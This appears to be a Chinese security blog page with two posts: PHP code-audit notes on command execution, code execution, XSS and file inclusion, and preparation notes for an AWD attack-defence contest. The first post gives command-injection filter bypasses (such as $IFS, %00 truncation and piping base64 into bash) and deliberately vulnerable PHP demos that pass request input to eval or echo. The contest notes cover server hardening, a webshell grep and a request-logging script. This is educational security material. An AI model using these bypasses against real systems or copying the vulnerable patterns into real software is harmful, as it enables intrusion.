-<h5 id="常见php命令执行函数"><a href="#常见php命令执行函数" class="headerlink" title="常见php命令执行函数"></a>常见php命令执行函数</h5><p>exec()、 system() 、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec()、反引号` 实际上是使用shell_exec()函数</p>
-<p>system()输出并返回最后一行shell的结果</p>
-<p>exec()不输出结果，返回最后一行shell的结果，所有结果可以保存到一个返回的数组里。</p>
-<p>passthru() 只调用命令，把命令的运行结果原封不动的输出到标准输出设备上</p>
-<p>popen()、proc_open() 不会直接返回执行结果、而是返回一个文件指针</p>
-<h5 id="漏洞利用以及绕过姿势："><a href="#漏洞利用以及绕过姿势：" class="headerlink" title="漏洞利用以及绕过姿势："></a>漏洞利用以及绕过姿势：</h5><p>各种逻辑运算符</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| 将前者的执行结果作为参数交给后者进行执行</span><br><span class="line">|| 前面出错执行后面的 ping xxx||whoami</span><br><span class="line">&amp; 前面为真为假不影响后面命令的执行</span><br><span class="line">&amp;&amp; 前面的为假后面的不执行，前面只可为真。</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
-
-<p><strong>针对空格过滤:</strong></p>
-<blockquote>
-<p>$IFS绕过 </p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls$IFS-la</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024135433323.png" alt="image-20211024135433323"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;或者&lt;&gt;绕过</span><br><span class="line">cat&gt;test.sql</span><br><span class="line">cat&lt;&gt;test.sql</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>php环境下(%09)</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%09test.sql</span><br></pre></td></tr></table></figure>
-
-<p><strong>消除后缀的影响</strong></p>
-<p>例如</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$target</span>.<span class="string">&#x27;.com&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>执行命令时虽没有任何过滤，但会在我们输入的命令后拼接上.com，如果我们不做处理的话，执行的命令将会失去我们原来的含义，因此，我们要提前将后面的尾缀(.com)截断</p>
-<blockquote>
-<p>%00截断</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wadwad|whoami%<span class="number">00</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024140510347.png" alt="image-20211024140510347"></p>
-<blockquote>
-<p>%20%23</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wdad|ls%<span class="number">20</span>%<span class="number">23</span> <span class="comment">#也就是空格# 将后面的字符注释掉</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>黑名单绕过</strong></p>
-<blockquote>
-<p>拼接字符</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=test.sql;$a<span class="variable">$b</span> <span class="variable">$c</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>编码绕过</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wad |echo &#x27;d2hvYW1p&#x27;|base64 -d |bash</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>单双引号</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat test.sql</span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t tes<span class="string">&quot;&quot;</span>t.sql</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>反斜杠利用</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat test.sql</span><br><span class="line">c\a\t te\s\t.sql</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>通配符绕过黑名单限制</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个?代表一个字符，*代表若干字符</span><br><span class="line">/bin/cat test.sql</span><br><span class="line">/bin/c?t tes?.sq? #会输出许多内容，其中包括test.sql的内容</span><br></pre></td></tr></table></figure>
-
-<h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><h5 id="常见危险函数-assert与eval"><a href="#常见危险函数-assert与eval" class="headerlink" title="常见危险函数(assert与eval)"></a>常见危险函数(assert与eval)</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">   print_r(<span class="variable">$cmd</span>);</span><br><span class="line">   <span class="keyword">eval</span>(<span class="string">&quot;\$cmd = <span class="subst">$cmd</span>&quot;</span>);<span class="comment">//assret()函数也是一样的，这里没对用户输入做过滤</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;not&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="常见回调函数"><a href="#常见回调函数" class="headerlink" title="常见回调函数"></a>常见回调函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常用回调函数有： </span><br><span class="line">call_user_func(evil,<span class="variable">$cmd</span>);	<span class="comment">#第一个参数是会回调函数 第二个参数视为回调函数的参数</span></span><br><span class="line">call_user_func_array(evil,<span class="keyword">array</span>(<span class="variable">$cmd</span>)); <span class="comment">#第一个参数视为回调函数 第二个参数`数组`视为回调函数的参数</span></span><br><span class="line">array_map(evil,<span class="keyword">array</span>(<span class="variable">$cmd</span>)); <span class="comment">#第一个参数视为回调函数 第二个参数`数组`视为回调函数的参数</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#call_user_func(callable $callback , mixed $Parameter，mixed $xxx)</span></span><br><span class="line"><span class="comment">#第一个参数$callback是被调用的回调函数，剩下的参数是回调函数的参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写一个回调函数小demo</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"><span class="variable">$Parameter</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$Parameter</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Parameter</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">call_user_func(evil,<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024144125269.png" alt="image-20211024144125269"></p>
-<h5 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h5><p>定义一个函数，将想要调用的变量名赋值给字符串，使用变量名代替函数名动态调用函数。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#需求： 写一个利用字符串来调用exec的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Callme</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Parameter1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$Parameter2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$Parameter1</span>(<span class="variable">$Parameter2</span>);</span><br><span class="line">&#125;</span><br><span class="line">Callme();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>​    </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#利用回调函数执行命令</span><br><span class="line">call_user_func_array($_GET[&#x27;name&#x27;],array($_GET[&#x27;cmd&#x27;]));</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024150119435.png" alt="image-20211024150119435"></p>
-<h5 id="preg-relpace函数："><a href="#preg-relpace函数：" class="headerlink" title="preg_relpace函数："></a>preg_relpace函数：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> preg_replace(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
-
-<p>函数可根据pattern来匹配subject符合条件的部分，并且将其提花能成replacement中的字符</p>
-<h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="反射性"><a href="#反射性" class="headerlink" title="反射性"></a>反射性</h5><p>demo:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>没有任何的过滤拦截，在GET请求输入xss代码，于页面打印并执行，形成xss漏洞。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">////获取浏览器header头user-agent信息</span></span><br><span class="line"><span class="comment">//echo $_SERVER[&#x27;HTTP_USER_AGENT&#x27;].&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////获取浏览器从哪个页面跳转过来的信息，Referer</span></span><br><span class="line"><span class="comment">//echo $_SERVER[&#x27;HTTP_REFERER&#x27;].&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>];</span><br><span class="line"><span class="variable">$xss</span> = preg_replace(<span class="string">&quot;/&lt;script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$xss</span>);</span><br><span class="line"><span class="variable">$xss</span> = preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>利用preg_replace 进行拦截，但我们可以发现，<strong>preg_replace(“/<script>/","",$xss);<strong>此处，正则匹配表达式未开启</strong>/i</strong>忽略大小写模式，并且只是单次将恶意字符替换为空，这导致我们可以通过双写、大小写、执行其他js语句等方法绕过防护并执行xss恶意代码</p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024161516161.png" alt="image-20211024161516161"></p>
-<p>存储型：</p>
-<p>dom型</p>
-<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含:"></a>文件包含:</h4><p>文件包含有远程文件包含、本地文件包含之分。</p>
-<p>远程文件包含需要在php.ini中设置，可在phpinfo中查看是否开启。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = on </span><br><span class="line">allow_url_fopen=on</span><br></pre></td></tr></table></figure>
-
-<p>文件包含特征函数:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 使用<span class="keyword">include</span>包含文件时，只有当代码执行到<span class="keyword">include</span>时才会调用被包含的文件，当被包含的文件产生错误时，只会返回错误提醒，不会停止php文件的执行</span><br><span class="line"><span class="keyword">require</span>(): 在php页面之前，<span class="keyword">require</span>会将被包含文件整个替换进本php文件，并与原php文件拼接成一个新的php文件，之后按照新的php脚本的顺序进行执行</span><br><span class="line"><span class="keyword">include_once</span>(): 包含前进行检测，若已被本页面的其他部分包含过就不再包含</span><br><span class="line"><span class="keyword">require_once</span>():当重复调用<span class="keyword">require_once</span>包含同一文件时，php只执行一次</span><br></pre></td></tr></table></figure>
-
-<h5 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h5><p>php文件:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./phpinfo.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>被包含文件:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024172509362.png" alt="image-20211024172509362"></p>
-<p>此处可发现，文件包含可配合文件上传等功能联合食用，即使被包含的文件并非php文件也可执行代码语句</p>
-<p>若包含文件路径可控，我们可根据ssh 、apache access log 投毒进行getshell操作</p>
-<h5 id="远程包含："><a href="#远程包含：" class="headerlink" title="远程包含："></a>远程包含：</h5><p>当被包含的文件在远程服务器时，便形成了远程文件包含，常见触发点，网络图片处</p>
-<p>需allow_url_include = on以及allow_url_fopen=on开启</p>
-<p>开启参数才可进行远程文件包含</p>
-</script></strong></p>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-awd知识梳理" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/" class="article-date">
-      <time datetime="2021-10-22T09:02:01.000Z" itemprop="datePublished">2021-10-22</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">awd知识梳理</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>由于一个月后需要参加一项awd比赛，为了防止过去之后什么也不懂的情况发生，写下这篇笔记用于记录整理awd比赛可能会用到的一些零零碎碎的知识点。</p>
-<h2 id="0X01-目录索引"><a href="#0X01-目录索引" class="headerlink" title="0X01 目录索引"></a>0X01 目录索引</h2><ol>
-<li>加固阶段</li>
-<li>攻防阶段</li>
-</ol>
-<h3 id="1-加固阶段"><a href="#1-加固阶段" class="headerlink" title="1.加固阶段"></a>1.加固阶段</h3><ol>
-<li><p>修改ssh登陆密码</p>
-<p>首先根据主办方提供的ssh账号登陆到我们的服务器，并在第一时间下通过passwd修改密码，最好改为强密码，避免其他队伍通过弱口令或默认口令进入我们服务器。<img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022155257543.png" alt="image-20211022155257543"></p>
-</li>
-<li><p>备份mysql数据库、网站源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p 数据库名 &gt; 备份文件 <span class="comment">#进行数据库备份</span></span><br><span class="line">source C:\User\<span class="number">86156</span>\Desktop\web\test.sql <span class="comment">#进入数据库，将数据库备份文件导入</span></span><br><span class="line">tar -czvf 打包文件.tar.gz  打包目录 </span><br><span class="line">tar -zxvf 打包文件  <span class="comment">#解压打包文件</span></span><br><span class="line">利用python3 -m http.server <span class="number">8080</span>| python -m SimpleHTTPServer <span class="number">8080</span>|scp 命令将文件传输至本机进行审计</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li>
-<li><p>进入web主目录审计源码，查找隐藏后门文件以及webshell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al #列出目录内所有文件，避免.xxx.php 从而被隐藏后门文件。</span><br><span class="line">crontab -e #查看计划任务表</span><br><span class="line">cat /etc/crontab </span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161419311.png" alt="image-20211022161419311"></p>
-</li>
-<li><p>利用find | xrags grep “xxx” 粗略查找网站中的隐藏后门，找到后对其进行删除操作</p>
-</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /<span class="keyword">var</span>/www/html |xargs grep <span class="string">&quot;system&quot;</span> </span><br><span class="line"><span class="comment">#system、eval、assert、exec、passthru、shell_exec都要留心查一下</span></span><br><span class="line"><span class="comment">#include、require、include_once 、require_once等包含函数也可留意</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161723171.png" alt="image-20211022161723171"></p>
-<p>​            5.后门排查完毕后，对代码进行审计，重点查看upload以及sql，若主办方还提供D盾等排查后门工具，可一起利用d盾进行后门排查</p>
-<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022163226399.png" alt="image-20211022163226399"></p>
-<h3 id="2-攻防阶段"><a href="#2-攻防阶段" class="headerlink" title="2.攻防阶段"></a>2.攻防阶段</h3><p>1安排上流量监控脚本，筛选其他攻击队的可利用payload放入自己武器库之中</p>
-<p>使用时需要将waf.php include包含进文件之中。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&#x27;LOG_FILEDIR&#x27;</span>,<span class="string">&#x27;./logs&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getallheaders&#x27;</span>)) &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&#x27;HTTP_&#x27;</span>)</span><br><span class="line"><span class="variable">$headers</span>[str_replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, ucwords(strtolower(str_replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27; &#x27;</span>, substr(<span class="variable">$name</span>, <span class="number">5</span>)))))] = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$header</span> = getallheaders();</span><br><span class="line"><span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$filepath</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$files</span>[<span class="variable">$key</span>][<span class="string">&#x27;content&#x27;</span>] = file_get_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;virink&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$header</span>[<span class="string">&#x27;Accept&#x27;</span>]);</span><br><span class="line"><span class="variable">$input</span> = <span class="keyword">array</span>(<span class="string">&quot;Get&quot;</span>=&gt;<span class="variable">$get</span>, <span class="string">&quot;Post&quot;</span>=&gt;<span class="variable">$post</span>, <span class="string">&quot;Cookie&quot;</span>=&gt;<span class="variable">$cookie</span>, <span class="string">&quot;File&quot;</span>=&gt;<span class="variable">$files</span>, <span class="string">&quot;Header&quot;</span>=&gt;<span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line">logging(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$LOG_FILENAME</span> = LOG_FILEDIR.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;Y-m-d G:i:s&quot;</span>);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>, <span class="string">&quot;\r\n&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;\r\n&quot;</span>.print_r(<span class="variable">$var</span>, <span class="literal">true</span>), FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n&quot;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n***************************************************************&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>
-
-<p>同时可联用apache、nginx的日志文件，通过grep筛查拿到可利用payload</p>
-<p>2.根据后门文件写批量拿flag脚本，人菜写的脚本烂，诸位师傅别骂哈</p>
